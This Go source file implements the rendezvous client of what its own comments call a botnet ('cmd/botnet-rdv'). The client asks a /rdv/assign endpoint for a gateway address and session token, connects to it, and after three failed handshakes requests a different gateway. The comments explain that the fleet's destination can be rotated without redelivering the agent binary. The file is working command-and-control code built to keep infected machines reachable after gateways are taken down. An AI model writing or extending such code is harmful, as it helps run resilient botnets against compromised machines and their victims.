package tunnel

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net"
	"net/http"
	"sync/atomic"
	"time"
)

// Rendezvous sin estado (BLUEPRINT §5, injerto P1, T-0402): el agente
// pregunta GET /rdv/assign y recibe {gateway_addr, session_token, ttl_s}.
// Rotar el destino de la flota es cambiar el backend del rdv, nunca
// reentregar el binario. Tras 3 handshakes fallidos contra el gateway
// asignado, el agente pide re-asignacion y loguea "rdv=reassign".

// RdvAssignJSON es la respuesta de GET /rdv/assign: EXACTAMENTE 3 claves
// (asercion del handler en cmd/botnet-rdv).
type RdvAssignJSON struct {
	GatewayAddr  string `json:"gateway_addr"`
	SessionToken string `json:"session_token"`
	TTLS         int    `json:"ttl_s"`
}

// ErrRdvNotAssigned: sin gateway tras los reintentos.
var ErrRdvNotAssigned = errors.New("tunnel: rendezvous sin asignacion")

// RDV es el cliente del agente. HTTP y Dial son inyectables (tests sin
// red real). Log es el hook de observabilidad: el assert del criterio 3
// vigila la linea "rdv=reassign".
type RDV struct {
	URL   string // base del servicio, p.ej. https://rdv.example
	HTTP  *http.Client
	Dial  func(addr string) (net.Conn, error)
	Log   func(msg string, kv ...any)
	Tries int // handshakes fallidos antes de re-asignar (3 por contrato)

	MaxReassign int // techos de re-asignaciones por Connect (5 por defecto)

	assigned atomic.Pointer[RdvAssignJSON]
	Fails    atomic.Uint32 // handshakes fallidos acumulados (metrica)
}

func (r *RDV) log(msg string, kv ...any) {
	if r.Log != nil {
		r.Log(msg, kv...)
	}
}

func (r *RDV) tries() int {
	if r.Tries <= 0 {
		return 3
	}
	return r.Tries
}

// Assign pregunta /rdv/assign y cachea la asignacion vigente.
func (r *RDV) Assign(ctx context.Context) (RdvAssignJSON, error) {
	httpc := r.HTTP
	if httpc == nil {
		httpc = &http.Client{Timeout: 10 * time.Second}
	}
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, r.URL+"/rdv/assign", nil)
	if err != nil {
		return RdvAssignJSON{}, err
	}
	resp, err := httpc.Do(req)
	if err != nil {
		return RdvAssignJSON{}, fmt.Errorf("tunnel: GET /rdv/assign: %w", err)
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(io.LimitReader(resp.Body, 4096))
	if err != nil {
		return RdvAssignJSON{}, err
	}
	if resp.StatusCode != http.StatusOK {
		return RdvAssignJSON{}, fmt.Errorf("tunnel: GET /rdv/assign: status %d", resp.StatusCode)
	}
	var a RdvAssignJSON
	if err := json.Unmarshal(body, &a); err != nil {
		return RdvAssignJSON{}, fmt.Errorf("tunnel: /rdv/assign JSON: %w", err)
	}
	if a.GatewayAddr == "" {
		return RdvAssignJSON{}, ErrRdvNotAssigned
	}
	r.assigned.Store(&a)
	return a, nil
}

// Current devuelve la asignacion vigente sin preguntar.
func (r *RDV) Current() *RdvAssignJSON { return r.assigned.Load() }

// Connect modela el handshake contra el gateway asignado con la regla de
// re-asignacion (AC3): tras `tries` handshakes fallidos contra el mismo
// destino, el agente vuelve a /rdv/assign, exige un gateway_addr
// distinto y loguea "rdv=reassign". Devuelve la conexion viva.
func (r *RDV) Connect(ctx context.Context) (net.Conn, RdvAssignJSON, error) {
	dial := r.Dial
	if dial == nil {
		dial = func(addr string) (net.Conn, error) { return net.Dial("tcp", addr) }
	}
	a, err := r.Assign(ctx)
	if err != nil {
		return nil, RdvAssignJSON{}, err
	}
	maxReassign := r.MaxReassign
	if maxReassign <= 0 {
		maxReassign = 5
	}
	for round := 0; ; round++ {
		var conn net.Conn
		for fails := 0; fails < r.tries(); fails++ {
			conn, err = dial(a.GatewayAddr)
			if err == nil {
				return conn, a, nil
			}
			r.Fails.Add(1)
		}
		if round >= maxReassign {
			return nil, a, fmt.Errorf("%w: gateway %s sigue caido", ErrRdvNotAssigned, a.GatewayAddr)
		}
		// 3 handshakes fallidos => re-asignacion obligatoria con destino
		// distinto (el rdv redondea la flota hacia otro gateway).
		prev := a.GatewayAddr
		a, err = r.Assign(ctx)
		if err != nil {
			return nil, RdvAssignJSON{}, err
		}
		if a.GatewayAddr == prev {
			return nil, a, fmt.Errorf("%w: re-asignacion repite %s", ErrRdvNotAssigned, prev)
		}
		r.log("rdv=reassign", "from", prev, "to", a.GatewayAddr)
	}
}
